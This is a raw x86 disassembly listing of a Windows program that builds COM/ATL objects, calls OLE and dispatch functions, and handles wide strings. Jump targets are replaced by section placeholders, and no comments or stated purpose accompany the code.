mov ecx [ esp + 0x64 ]
lea edx [ esp + 0x20 ]
mov [ esp + 0x14 ] edx
lea edx [ esp + 0x24 ]
push edx
mov [ esp + 0x24 ] sub_42e115
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] ecx
call [ VariantInit@IAT ]
mov [ esp + 0x5c ] 0x0
mov eax [ esp + 0x70 ]
test eax eax
jne r-xdata
mov esi eax
shl esi 0x4
mov ecx [ edx ]
mov ebp [ edx + 0x4 ]
mov ebp [ ebp + eax * 4 ]
add ecx esi
mov [ edi + ebp * 4 ] ecx
mov ecx [ edx + 0xc ]
inc eax
add esi 0x10
cmp eax ecx
jb r-xdata
movsx ecx [ ebx + 0x6 ]
push eax
push edi
xor edx edx
mov dx [ ebx + 0x4 ]
lea eax [ ebx + 0x8 ]
push eax
mov eax [ ebx ]
push ecx
lea ecx [ esp + 0x24 ]
push edx
push eax
push 0x0
push ecx
call [ DispCallFunc@IAT ]
mov esi eax
mov [ esp + 0x5c ] 0xffffffff
lea edx [ esp + 0x24 ]
push edx
call [ VariantClear@IAT ]
mov ecx [ esp + 0x54 ]
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x50
retn 0x10
lea eax [ esp + 0x24 ]
movsx ebp [ ebx + 0x6 ]
mov ecx [ edx ]
add ecx esi
sub ebp eax
mov [ edi + ebp * 4 - 0x4 ] ecx
mov ecx [ edx + 0x8 ]
inc eax
add esi 0x10
cmp eax ecx
jb r-xdata
sub_407630
push 0xffffffff
push sub_42f9e8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call sub_406b60
mov [ esp + 0x10 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x4 ] r--data
mov [ esi + 0x8 ] r--data
mov [ esi + 0xc ] r--data
mov [ esi + 0x10 ] r--data
mov ecx [ rw-data ]
mov eax [ ecx ]
call [ eax + 0x4 ]
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_4076c0
mov ecx [ esp + 0x4 ]
mov edx [ ecx + 0x14 ]
dec edx
push esi
mov esi edx
test esi esi
mov [ ecx + 0x14 ] edx
jne r-xdata
mov eax esi
pop esi
retn 0x4
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x10 ]
sub_4077a0
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x4 ]
push esi
mov esi [ eax ]
add esi ecx
call [ eax + 0x4 ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push ecx
push edx
push eax
push esi
call [ Ordinal_ATL71_32@IAT ]
pop esi
retn 0x10
sub_407830
push 0xffffffff
push sub_42fa08
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] r--data
mov [ esi + 0x4 ] r--data
mov [ esi + 0x8 ] r--data
mov [ esi + 0xc ] r--data
mov [ esi + 0x10 ] r--data
mov [ esp + 0x10 ] 0x0
mov [ esi + 0x14 ] 0xc0000001
mov ecx [ rw-data ]
mov eax [ ecx ]
call [ eax + 0x8 ]
mov [ esp + 0x10 ] 0xffffffff
mov ecx esi
call sub_405ab0
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4078b0
push 0xffffffff
push sub_42fa2b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
mov esi ecx
mov [ esi + 0x4 ] 0x0
push eax
lea ecx [ esi + 0x8 ]
mov [ esp + 0x8 ] esi
mov [ esi ] r--data
call sub_406be0
mov [ esp + 0x10 ] 0x0
mov ecx [ rw-data ]
mov edx [ ecx ]
call [ edx + 0x4 ]
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_407930
mov ecx [ esp + 0x4 ]
mov edx [ ecx + 0x4 ]
dec edx
push esi
mov esi edx
test esi esi
mov [ ecx + 0x4 ] edx
jne r-xdata
mov eax esi
pop esi
retn 0x4
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0xc ]
sub_407960
mov ecx [ esp + 0xc ]
test ecx ecx
jne r-xdata
mov eax [ esp + 0x8 ]
mov [ ecx ] 0x0
mov edx [ eax ]
push esi
xor esi esi
test edx edx
jne r-xdata
mov eax 0x80004003
retn 0xc
mov edx [ esp + 0x8 ]
push ecx
push eax
push r--data
add edx 0x8
push edx
call [ Ordinal_ATL71_32@IAT ]
mov esi eax
pop esi
retn 0xc
mov edx [ eax + 0x4 ]
test edx edx
jne r-xdata
cmp [ eax + 0x8 ] 0xc0
jne r-xdata
cmp [ eax + 0xc ] 0x46000000
jne r-xdata
mov eax [ esp + 0x8 ]
mov [ ecx ] eax
mov ecx [ eax ]
push eax
call [ ecx + 0x4 ]
mov eax esi
pop esi
retn 0xc
sub_4079f0
push 0xffffffff
push sub_42fa53
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] r--data
mov [ esp + 0x10 ] 0x0
mov [ esi + 0x4 ] 0xc0000001
mov ecx [ rw-data ]
mov eax [ ecx ]
call [ eax + 0x8 ]
or eax 0xffffffff
mov [ esp + 0x10 ] eax
lea ecx [ esi + 0x8 ]
mov [ esp + 0x4 ] ecx
mov [ esp + 0x10 ] eax
call sub_405ab0
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_407a60
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
push ebp
mov ebp [ InterlockedDecrement@IAT ]
add esi 0x8
cmp esi ebx
jne r-xdata
push eax
call ebp
test eax eax
jg r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
pop ebp
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_407ae0
push ebp
mov ebp esp
push 0xffffffff
push sub_42fa60
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
mov ebx [ ebp + 0x10 ]
xor esi esi
cmp ebx esi
jne r-xdata
mov [ ebx ] esi
mov edi 0x8007000e
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] esi
push 0x38
call sub_42e3bc
add esp 0x4
mov [ ebp - 0x1c ] eax
cmp eax esi
je r-xdata
mov eax 0x80004003
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
xor eax eax
mov esi eax
mov [ ebp - 0x14 ] esi
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx eax
call sub_407630
mov esi eax
mov [ ebp - 0x14 ] esi
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
test esi esi
je r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edx [ esi ]
push ebx
mov eax [ ebp + 0xc ]
push eax
push esi
call [ edx ]
mov edi eax
test edi edi
je r-xdata
mov edx [ esi ]
push 0x1
mov ecx esi
call [ edx + 0x10 ]
sub_407bb0
push ebp
mov ebp esp
push 0xffffffff
push sub_42fa7b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x14
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
xor ebx ebx
mov eax [ ebp + 0x10 ]
cmp eax ebx
jne r-xdata
mov [ eax ] ebx
mov edi 0x8007000e
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
push 0x40
call sub_42e3bc
add esp 0x4
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0x1
cmp eax ebx
je r-xdata
mov eax 0x80004003
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
xor eax eax
mov esi eax
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x14 ] esi
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx eax
call sub_4078b0
mov esi eax
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x14 ] esi
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp esi ebx
je r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edx [ esi ]
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
push esi
call [ edx ]
mov edi eax
cmp edi ebx
je r-xdata
mov edx [ esi ]
push 0x1
mov ecx esi
call [ edx + 0xc ]
sub_407c44
xor ebx ebx
mov edi [ ebp - 0x18 ]
mov esi [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0xffffffff
cmp esi ebx
je r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edx [ esi ]
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
push esi
call [ edx ]
mov edi eax
cmp edi ebx
je r-xdata
mov edx [ esi ]
push 0x1
mov ecx esi
call [ edx + 0xc ]
sub_407cd0
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
pop esi
pop ecx
retn
mov ecx [ esp + 0x4 ]
mov edx [ esi + 0x8 ]
push ecx
push esi
push edx
push eax
call sub_407a60
mov eax [ esi + 0x4 ]
push eax
call ??3@YAXPAX@Z
add esp 0x14
sub_407d30
push 0xffffffff
mov eax [ fs : 0x0 ]
push sub_42fa98
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
mov ebx [ esp + 0x28 ]
push ebp
mov ebp [ esp + 0x28 ]
push esi
mov esi ecx
mov [ esi + 0x18 ] ebp
mov ecx ebx
mov edx [ ecx ]
lea eax [ esi + 0x8 ]
mov [ eax ] edx
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ecx + 0x8 ]
mov [ eax + 0x8 ] edx
mov ecx [ ecx + 0xc ]
push edi
lea edi [ esi + 0x4 ]
mov [ eax + 0xc ] ecx
mov eax [ edi ]
test eax eax
je r-xdata
push edi
push r--data
push 0x0
mov [ edi ] 0x0
call sub_407ae0
test eax eax
jl r-xdata
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
mov ecx [ esp + 0x20 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x1c
retn 0xc
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x4 ]
cmp [ edi ] 0x0
jne r-xdata
push 0x80004003
call sub_42cee0
mov eax [ edi ]
mov edx [ eax ]
push eax
call [ edx + 0x4 ]
mov eax [ edi ]
mov [ eax + 0x14 ] ebp
mov edx [ ebx ]
mov ebp [ esp + 0x38 ]
lea ecx [ eax + 0x18 ]
mov [ ecx ] edx
mov edx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ ecx + 0x8 ] edx
mov edx [ ebx + 0xc ]
lea ebx [ eax + 0x28 ]
cmp ebx ebp
mov [ ecx + 0xc ] edx
je r-xdata
push 0x80004003
call sub_42cee0
xor eax eax
mov [ esp + 0x30 ] eax
mov [ esp + 0x28 ] eax
cmp [ edi ] eax
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
mov eax [ esp + 0x30 ]
test eax eax
mov ebx [ edi ]
je r-xdata
push 0x80004003
call sub_42cee0
mov eax [ ebp ]
mov [ ebx ] eax
mov ebp [ ebp + 0x4 ]
test ebp ebp
mov [ ebx + 0x4 ] ebp
je r-xdata
mov ecx ebx
call sub_4046f0
lea eax [ esp + 0x30 ]
push eax
push r--data
mov [ esp + 0x38 ] 0x0
mov edx [ ebx ]
push ebx
call [ edx ]
mov ebx eax
test ebx ebx
jge r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
push ebp
call [ InterlockedIncrement@IAT ]
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esp + 0x28 ] 0xffffffff
mov eax [ esp + 0x30 ]
test eax eax
je r-xdata
mov eax [ esp + 0x30 ]
mov edi [ edi ]
push esi
push eax
push edi
push 0x0
push 0x1
push r--data
push r--data
mov [ esi ] 0x0
call [ OleCreate@IAT ]
mov edi eax
test edi edi
jge r-xdata
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
pop edi
pop esi
pop ebp
mov eax ebx
pop ebx
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
add esp 0x1c
retn 0xc
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ esi ]
push 0x1
push eax
call [ OleSetContainedObject@IAT ]
cmp [ esi ] 0x0
jne r-xdata
mov [ esp + 0x28 ] 0xffffffff
mov eax [ esp + 0x30 ]
test eax eax
je r-xdata
mov eax [ esi ]
mov edx [ eax ]
lea ecx [ esp + 0x34 ]
push ecx
push 0x1
push eax
call [ edx + 0x58 ]
mov edi eax
test edi edi
jge r-xdata
push 0x80004003
call sub_42cee0
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
add esp 0x1c
retn 0xc
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ esp + 0x34 ]
test ah 0x4
jne r-xdata
mov [ esp + 0x28 ] 0xffffffff
mov eax [ esp + 0x30 ]
test eax eax
je r-xdata
mov [ esp + 0x28 ] 0xffffffff
mov eax [ esp + 0x30 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ esi + 0x10 ]
sub eax ecx
mov ecx [ esi + 0x14 ]
mov [ esp + 0x10 ] eax
sub ecx [ esi + 0xc ]
lea edx [ esp + 0x18 ]
push edx
lea eax [ esp + 0x14 ]
push eax
mov [ esp + 0x1c ] ecx
call [ Ordinal_ATL71_28@IAT ]
mov ecx esi
call sub_403770
mov ecx [ eax ]
lea edx [ esp + 0x18 ]
push edx
push 0x1
push eax
call [ ecx + 0x44 ]
mov ecx esi
call sub_403770
mov ecx [ eax ]
lea edx [ esp + 0x18 ]
push edx
push 0x1
push eax
call [ ecx + 0x48 ]
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x1c ]
push ecx
call [ Ordinal_ATL71_27@IAT ]
mov edx [ esi + 0x8 ]
mov edi [ esp + 0x10 ]
mov eax [ esi + 0xc ]
mov ecx [ esp + 0x14 ]
add edx edi
add eax ecx
mov [ esi + 0x10 ] edx
mov [ esi + 0x14 ] eax
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
add esp 0x1c
retn 0xc
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
xor eax eax
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_408000
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
pop esi
pop ecx
retn
mov ecx [ esp + 0x4 ]
mov edx [ esi + 0x8 ]
push ecx
push esi
push edx
push eax
call sub_407a60
mov eax [ esi + 0x4 ]
push eax
call ??3@YAXPAX@Z
add esp 0x14
sub_408040
push 0xffffffff
push sub_42fb01
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push esi
push edi
mov esi ecx
xor edi edi
mov [ esp + 0xc ] esi
mov [ esi ] edi
mov [ esp + 0x18 ] edi
mov [ esi + 0x4 ] edi
mov [ esp + 0x18 ] 0x2
mov [ esi + 0x1c ] edi
mov [ esp + 0x18 ] 0x3
lea ebx [ esi + 0x20 ]
mov ecx ebx
call sub_4059f0
mov [ ebx ] r--data
mov [ esi + 0x84 ] edi
mov [ esi + 0x88 ] edi
mov [ esi + 0x8c ] edi
mov [ esp + 0x18 ] 0x4
mov [ esi + 0x90 ] edi
mov [ esp + 0x18 ] 0x5
lea ecx [ esi + 0x94 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x18 ] 0x6
mov eax [ esp + 0x20 ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x4c ] esi
mov [ esi + 0x54 ] edi
mov [ esi + 0x58 ] edi
mov [ esi + 0x6c ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0x74 ] edi
mov [ esi + 0x78 ] edi
mov [ esi + 0x7c ] edi
mov [ esp + 0x18 ] 0xffffffff
mov ecx [ esp + 0x10 ]
pop edi
mov eax esi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_408100
push 0xffffffff
push sub_42fb4e
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ esp + 0xc ] edi
mov [ esp + 0x18 ] 0x3
lea ecx [ edi + 0x94 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x18 ] 0x2
mov eax [ edi + 0x90 ]
xor ebx ebx
cmp eax ebx
je r-xdata
mov [ esp + 0x18 ] 0x1
mov eax [ edi + 0x84 ]
cmp eax ebx
lea esi [ edi + 0x80 ]
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esp + 0x18 ] bl
mov eax [ edi + 0x1c ]
cmp eax ebx
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esi + 0x8 ]
push edx
push esi
push ecx
push eax
call sub_407a60
mov eax [ esi + 0x4 ]
push eax
call ??3@YAXPAX@Z
add esp 0x14
mov [ esp + 0x18 ] 0xffffffff
mov ecx edi
call sub_4050e0
mov ecx [ esp + 0x10 ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_4081c0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_42fb98
push eax
mov eax [ esp + 0x14 ]
mov [ fs : 0x0 ] esp
push ebx
push ebp
push esi
mov ebx ecx
mov edx eax
mov esi [ edx ]
lea ecx [ ebx + 0x5c ]
mov [ ecx ] esi
mov esi [ edx + 0x4 ]
mov [ ecx + 0x4 ] esi
mov esi [ edx + 0x8 ]
mov [ ecx + 0x8 ] esi
mov edx [ edx + 0xc ]
mov [ ecx + 0xc ] edx
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x1c ]
push edi
push ecx
push eax
push edx
mov ecx ebx
call sub_407d30
test eax eax
jl r-xdata
xor eax eax
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn 0xc
lea eax [ esp + 0x28 ]
push eax
mov ecx ebx
call sub_405230
mov esi eax
mov [ esp + 0x18 ] 0x0
cmp [ esi ] 0x0
jne r-xdata
mov edi [ esi ]
mov eax [ ebx + 0x1c ]
test eax eax
lea esi [ ebx + 0x1c ]
je r-xdata
push 0x80004003
call sub_42cee0
push esi
push r--data
mov [ esi ] 0x0
mov edx [ edi ]
push edi
call [ edx ]
mov edi eax
mov [ esp + 0x18 ] 0xffffffff
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
test edi edi
jl r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
lea edx [ esp + 0x24 ]
push edx
mov ecx ebx
call sub_405230
mov [ esp + 0x18 ] 0x1
mov eax [ esp + 0x24 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x90 ]
test eax eax
mov ebp [ esp + 0x24 ]
lea edi [ ebx + 0x90 ]
je r-xdata
push 0x80004003
call sub_42cee0
push edi
push r--data
mov [ edi ] 0x0
mov edx [ ebp ]
push ebp
call [ edx ]
test eax eax
jge r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ esi ]
push eax
lea ecx [ ebx + 0x20 ]
call sub_404490
test eax eax
jge r-xdata
mov eax [ esp + 0x24 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x50 ]
test eax eax
push ecx
mov [ esp + 0x2c ] esp
mov ecx esp
je r-xdata
mov [ esp + 0x18 ] 0xffffffff
mov eax [ esp + 0x24 ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
mov ebp [ esp + 0x24 ]
je r-xdata
push 0x80004003
call sub_42cee0
push r--data
call sub_4041b0
push r--data
call sub_4041b0
jmp r-xdata
xor eax eax
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn 0xc
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
push edi
push r--data
mov [ edi ] 0x0
mov edx [ ebp ]
push ebp
call [ edx ]
test eax eax
jl r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov ecx [ esi ]
mov [ esp + 0x1c ] 0x1
call sub_406eb0
cmp [ esi ] 0x0
jne r-xdata
push 0x80004003
call sub_42cee0
mov [ esp + 0x1c ] 0x1
mov ecx esi
call sub_403870
mov ecx eax
call sub_406db0
push ecx
mov ecx esp
mov [ esp + 0x2c ] esp
push r--data
call sub_4041b0
mov [ esp + 0x1c ] 0x4
cmp [ esi ] 0x0
jne r-xdata
mov [ esp + 0x18 ] 0xffffffff
mov eax [ esp + 0x24 ]
test eax eax
je r-xdata
mov edi [ esi ]
mov eax [ edi ]
push 0x0
push edi
call [ eax + 0x48 ]
test eax eax
jge r-xdata
push 0x80004003
call sub_42cee0
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
cmp [ esi ] 0x0
jne r-xdata
push r--data
push edi
push eax
call sub_42cef0
mov edi [ esi ]
mov ecx [ edi ]
push 0x1
push edi
call [ ecx + 0xd4 ]
test eax eax
jge r-xdata
push 0x80004003
call sub_42cee0
cmp [ esi ] 0x0
jne r-xdata
push r--data
push edi
push eax
call sub_42cef0
mov edi [ esi ]
mov edx [ edi ]
push 0x0
push edi
call [ edx + 0xb4 ]
test eax eax
jge r-xdata
push 0x80004003
call sub_42cee0
push ecx
mov ecx esp
mov [ esp + 0x2c ] esp
push r--data
call sub_404120
mov [ esp + 0x1c ] 0x5
cmp [ esi ] 0x0
jne r-xdata
push r--data
push edi
push eax
call sub_42cef0
mov ecx [ esi ]
mov [ esp + 0x1c ] 0x1
call sub_406e30
push 0xfffffffb
mov ecx ebx
call sub_405140
test eax eax
jge r-xdata
push 0x80004003
call sub_42cee0
push 0x1
mov ecx esi
call sub_403870
mov ecx eax
call sub_403280
push ecx
mov ecx esp
mov [ esp + 0x2c ] esp
push r--data
call sub_404120
mov [ esp + 0x1c ] 0x1
mov ecx esi
call sub_403870
mov ecx eax
call sub_406f30
mov [ esp + 0x18 ] 0xffffffff
mov eax [ esp + 0x24 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
pop edi
pop esi
pop ebp
mov eax 0x1
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0xc
retn 0xc
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
sub_408530
push 0xffffffff
push sub_42fbc8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x18 ]
mov [ esp + 0x8 ] esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
xor edi edi
mov [ esp + 0x14 ] edi
lea ecx [ esi + 0x34 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x14 ] 0x1
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0xc ] edi
mov [ esp + 0x14 ] 0xffffffff
mov ecx [ esp + 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4085a0
push 0xffffffff
push sub_42fbe8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call sub_412360
mov [ esp + 0x10 ] 0x0
mov eax [ esp + 0x18 ]
mov [ esi ] r--data
mov [ esi + 0x8 ] eax
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_408600
push 0xffffffff
push sub_42fc08
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ ecx ] r--data
mov [ esp + 0xc ] 0xffffffff
call sub_412370
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_408660
push 0xffffffff
push sub_42fc38
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esp + 0x10 ] 0x0
lea ecx [ esi + 0x34 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x10 ] 0xffffffff
lea ecx [ esi + 0x18 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4086b0
push 0xffffffff
push sub_42fc76
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] r--data
mov eax 0x1
mov [ esp + 0x14 ] eax
lea ecx [ esi + 0x6c ]
mov [ esp + 0x8 ] ecx
mov [ ecx ] r--data
mov [ esp + 0x14 ] al
call sub_412370
mov [ esp + 0x14 ] 0x0
lea ecx [ esi + 0x14 ]
call sub_408660
mov [ esp + 0x14 ] 0xffffffff
mov ecx esi
call sub_418460
mov ecx [ esp + 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_408720
push ebx
push ebp
mov ebp [ IsWindow@IAT ]
push esi
push edi
mov edi [ Sleep@IAT ]
mov ebx ecx
xor esi esi
push 0x3e8
call edi
mov ecx esi
inc esi
cmp ecx 0x5
jl r-xdata
mov eax [ eax + 0x4 ]
push eax
call ebp
test eax eax
jne r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov edx [ ebx + 0x64 ]
mov eax [ edx + 0x4 ]
push 0x0
push 0x0
push 0x10
push eax
call [ PostMessageW@IAT ]
pop edi
pop esi
pop ebp
pop ebx
retn
sub_4087c0
push 0xffffffff
push sub_42fc9e
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call sub_418410
mov [ esp + 0x10 ] 0x0
lea ecx [ esi + 0x14 ]
mov [ esi ] r--data
call sub_408530
mov [ esp + 0x10 ] 0x1
push esi
lea ecx [ esi + 0x6c ]
call sub_4085a0
mov [ esp + 0x10 ] 0x2
mov [ esi + 0x64 ] 0x0
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_408850
push 0xffffffff
push sub_42fcbb
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x30
push ebx
push ebp
push esi
push edi
xor edi edi
push edi
call [ OleInitialize@IAT ]
push 0x114
call sub_42e3bc
add esp 0x4
mov [ esp + 0x10 ] eax
